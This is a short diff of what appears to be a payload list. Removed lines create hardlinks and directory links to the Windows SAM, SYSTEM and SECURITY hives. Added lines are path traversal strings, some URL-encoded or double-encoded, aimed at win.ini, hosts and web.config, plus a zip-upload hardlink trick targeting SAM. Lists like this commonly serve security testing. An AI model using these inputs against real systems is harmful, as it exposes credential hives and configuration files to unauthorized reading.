@@ -1,5 +1,9 @@
-fsutil hardlink create C:\public\test.txt C:\Windows\System32\config\SAM
-mklink /H C:\public\link.txt C:\Windows\system32\config\system
-mklink /H exploit.txt C:\Windows\repair\SAM
-mklink /H out.txt C:\Windows\repair\security
-mklink /D C:\public\shadow C:\Windows\System32\config
+..\..\..\windows\win.ini
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\boot.ini
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\inetpub\wwwroot\web.config
+..%5c..%5cwindows%5cwin.ini
+..%255c..%255cwindows%255cwin.ini
+POST /extract (zip with hardlink to \Windows\System32\config\SAM)
